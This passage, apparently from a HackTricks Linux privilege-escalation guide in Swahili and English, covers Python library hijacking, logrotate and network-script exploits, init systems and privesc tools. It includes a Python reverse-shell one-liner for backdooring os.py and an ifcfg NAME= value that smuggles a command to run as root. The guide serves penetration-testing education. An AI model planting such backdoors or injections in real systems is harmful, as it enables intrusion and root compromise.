Sitaorodhesha hapa jinsi ya kufanya yote haya, lakini ikiwa una interest unaweza kuangalia checks za mwisho ambazo [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) hufanya.

## Writable files

### Python library hijacking

Ikiwa unajua **where** python script itatekelezwa na **can write inside** hiyo folder au unaweza **modify python libraries**, unaweza kurekebisha OS library na kui-backdoor (ikiwa unaweza kuandika mahali python script itatekelezwa, copy and paste os.py library).

Ili **backdoor the library**, ongeza line ifuatayo mwishoni mwa os.py library (badilisha IP na PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Exploitation ya logrotate

Udhaifu katika `logrotate` huwawezesha watumiaji walio na **ruhusa za kuandika** kwenye faili ya log au directories zake za mzazi kupata privileges zilizoinuliwa. Hii ni kwa sababu `logrotate`, ambayo mara nyingi huendeshwa kama **root**, inaweza kudhibitiwa ili kutekeleza mafaili holela, hasa katika directories kama _**/etc/bash_completion.d/**_. Ni muhimu kuangalia permissions si katika _/var/log_ pekee, bali pia katika directory yoyote ambako log rotation inatumika.

> [!TIP]
> Udhaifu huu huathiri `logrotate` version `3.18.0` na za zamani zaidi

Maelezo ya kina zaidi kuhusu udhaifu huu yanaweza kupatikana kwenye ukurasa huu: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Unaweza ku-exploit udhaifu huu kwa kutumia [**logrotten**](https://github.com/whotwagner/logrotten).

Udhaifu huu unafanana sana na [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** kwa hivyo kila unapogundua kuwa unaweza kubadilisha logs, angalia ni nani anayesimamia logs hizo na uangalie kama unaweza ku-escalate privileges kwa kubadilisha logs hizo kuwa symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Rejeleo la udhaifu:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Ikiwa, kwa sababu yoyote ile, mtumiaji anaweza **kuandika** script ya `ifcf-<whatever>` kwenye _/etc/sysconfig/network-scripts_ **au** anaweza **kurekebisha** script iliyopo, basi **system yako imedukuliwa**.

Network scripts, _ifcg-eth0_ kwa mfano, hutumika kwa connections za mtandao. Zinaonekana sawa kabisa na mafaili ya .INI. Hata hivyo, huwa \~sourced\~ kwenye Linux na Network Manager (dispatcher.d).

Katika hali yangu, attribute ya `NAME=` katika network scripts hizi haishughulikiwi kwa usahihi. Ikiwa kuna **nafasi nyeupe/tupu katika jina, system hujaribu kutekeleza sehemu iliyo baada ya nafasi hiyo nyeupe/tupu**. Hii inamaanisha kuwa **kila kitu baada ya nafasi tupu ya kwanza hutekelezwa kama root**.

Kwa mfano: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Kumbuka nafasi tupu kati ya Network na /bin/id_)

### **init, init.d, systemd, and rc.d**

Directory `/etc/init.d` ndiyo mahali pa **scripts** za System V init (SysVinit), mfumo wa **classic Linux service management**. Inajumuisha scripts za `start`, `stop`, `restart`, na wakati mwingine `reload` services. Hizi zinaweza kutekelezwa moja kwa moja au kupitia symbolic links zinazopatikana katika `/etc/rc?.d/`. Njia mbadala katika mifumo ya Redhat ni `/etc/rc.d/init.d`.

Kwa upande mwingine, `/etc/init` inahusishwa na **Upstart**, mfumo mpya zaidi wa **service management** ulioanzishwa na Ubuntu, unaotumia configuration files kwa kazi za service management. Licha ya mpito kwenda Upstart, SysVinit scripts bado zinatumika pamoja na Upstart configurations kutokana na compatibility layer katika Upstart.

**systemd** hujitokeza kama initialization na service manager ya kisasa, ikitoa vipengele vya juu kama vile kuanzisha daemons on-demand, usimamizi wa automount, na snapshots za hali ya system. Hupanga files katika `/usr/lib/systemd/` kwa distribution packages na `/etc/systemd/system/` kwa marekebisho ya administrator, hivyo kurahisisha mchakato wa system administration.

## Tricks Nyingine

### NFS Privilege escalation


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Kutoka kwenye restricted Shells


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks kwa kawaida hu-hook syscall ili kufichua kernel functionality yenye privileges kwa manager wa userspace. Manager authentication dhaifu (kwa mfano, signature checks zinazotegemea FD-order au password schemes dhaifu) zinaweza kuwezesha local app kujifanya manager na kufanya privilege escalation hadi root kwenye devices ambazo tayari zime-rootiwa. Jifunze zaidi na maelezo ya exploitation hapa:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery katika VMware Tools/Aria Operations inaweza kutoa binary path kutoka kwenye process command lines na kui-execute kwa -v chini ya privileged context. Patterns zinazoruhusu mengi (kwa mfano, kutumia \S) zinaweza ku-match listeners zilizowekwa na attacker katika writable locations (kwa mfano, /tmp/httpd), na kusababisha execution kama root (CWE-426 Untrusted Search Path).

Jifunze zaidi na uone generalized pattern inayotumika kwa discovery/monitoring stacks nyingine hapa:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Msaada zaidi

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Tool bora ya kutafuta Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Orodhesha kernel vulns katika Linux na MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation ya scripts zaidi**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)
- [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [Python importlib docs](https://docs.python.org/3/library/importlib.html)

{{#include ../../../banners/hacktricks-training.md}}
